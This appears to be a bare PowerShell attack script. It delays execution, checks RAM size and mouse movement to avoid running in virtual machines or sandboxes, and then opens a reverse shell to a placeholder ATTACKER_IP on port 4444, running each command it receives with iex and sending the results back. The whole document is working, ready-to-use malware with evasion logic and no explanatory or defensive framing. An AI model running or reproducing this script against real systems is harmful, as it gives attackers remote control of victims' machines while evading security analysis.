# --- Delay ---
Start-Sleep -Seconds 45

# --- Anti-VM: RAM check ---
$mem = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
if ($mem -lt 2147483648) { exit }

# --- Anti-VM: Mouse movement ---
Add-Type -AssemblyName System.Windows.Forms
$p1 = [System.Windows.Forms.Cursor]::Position
Start-Sleep -Seconds 10
$p2 = [System.Windows.Forms.Cursor]::Position
if ($p1 -eq $p2) { exit }

# --- Reverse shell ---
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
 $sendback = (iex $data 2>&1 | Out-String )
 $sendback2 = $sendback + "PS " + (pwd).Path + "> "
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
 $stream.Write($sendbyte,0,$sendbyte.Length)
 $stream.Flush()
}
$client.Close()
